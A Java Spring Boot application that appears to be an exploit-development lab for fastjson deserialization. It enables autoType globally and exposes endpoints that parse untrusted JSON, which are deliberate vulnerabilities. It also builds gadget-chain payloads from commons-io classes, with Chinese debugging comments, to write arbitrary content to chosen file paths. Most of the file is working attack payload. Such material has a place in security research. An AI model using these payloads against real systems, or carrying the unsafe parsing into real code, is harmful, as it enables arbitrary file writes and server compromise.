package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            Object result = JSONObject.parseObject(json);
            log.info("[RAW] ok type={}", result == null ? "null" : result.getClass().getName());
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[RAW-STACK] {}", sw);
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 针对日志分析结果的精确修复测试
     *
     * 根因：
     *   - charSequence 必须用 fastjson 换行符私有语法注入（step3 已证明可以，但 ReaderInputStream 失败）
     *   - ReaderInputStream(Reader,String,int) 因 commons-io 2.4 无 -parameters 编译，参数名丢失
     *     → charsetName 无法匹配 → NullPointerException
     *   - 解决：只提供 reader 字段，fastjson 选择单参数构造 ReaderInputStream(Reader)
     *   - WriterOutputStream.writer 字段类型是 Writer，不能用 AutoCloseable，要用 java.io.Writer
     *
     * step=A  ReaderInputStream 只传 reader（单参数构造）
     * step=B  WriterOutputStream.writer 用 java.io.Writer 声明
     * step=C  完整链（A+B 修复 + 换行符 charSequence + $ref 连接）
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "A");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();
        String json = null;
        try {
            switch (step) {

                case "A":
                    // ReaderInputStream 只传 reader → fastjson 选 ReaderInputStream(Reader)
                    // charSequence 用换行符语法（step3 证明可解析）
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                         + "\"reader\":{"
                             + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                             + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + content + "\",}"
                         + "}}";
                    break;

                case "B":
                    // WriterOutputStream.writer 用 java.io.Writer（而非 AutoCloseable）
                    json = "{\"@type\":\"java.lang.AutoCloseable\","
                         + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                         + "\"writer\":{"
                             + "\"@type\":\"java.io.Writer\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
                    break;

                case "C": {
                    // 完整链：修复所有已知问题
                    // lfw: LockableFileWriter（顶层 AutoCloseable）
                    // wos: WriterOutputStream，writer 用 java.io.Writer 声明引用 lfw
                    // ris: ReaderInputStream 只传 reader（单参数构造）
                    // tee: TeeInputStream，input=$ref.ris, branch=$ref.wos
                    // xml: XmlStreamReader，is=$ref.tee，触发读操作驱动数据流
                    String pad = content + " ".repeat(Math.max(0, 8193 - content.length()));
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                         + "\"lfw\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                             + "\"file\":\"" + file + "\","
                             + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                         + "\"wos\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                             + "\"writer\":{\"$ref\":\"$.lfw\"},"
                             + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                         + "\"ris\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\","
                             + "\"reader\":{"
                                 + "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\","
                                 + "\"charSequence\":{\"@type\":\"java.lang.String\"\n\"" + pad + "\",}}},"
                         + "\"tee\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                             + "\"input\":{\"$ref\":\"$.ris\"},"
                             + "\"branch\":{\"$ref\":\"$.wos\"},"
                             + "\"closeBranch\":true},"
                         + "\"xml\":{"
                             + "\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
                             + "\"httpContentType\":\"text/xml\","
                             + "\"lenient\":true,"
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                         + "}";
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be A/B/C"); return r;
            }

            log.info("[STEP-{}] json len={} preview={}", step, json.length(),
                    json.substring(0, Math.min(120, json.length())));

            Object result = JSONObject.parseObject(json);
            log.info("[STEP-{}] parseObject OK, resultType={}", step,
                    result == null ? "null" : result.getClass().getName());

            File f = new File(file);
            boolean exists = f.exists();
            long size = exists ? f.length() : -1;
            log.info("[STEP-{}] file={} exists={} size={}", step, file, exists, size);

            r.put("ok", true);
            r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
            r.put("fileExists", exists);
            r.put("fileSize", size);

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
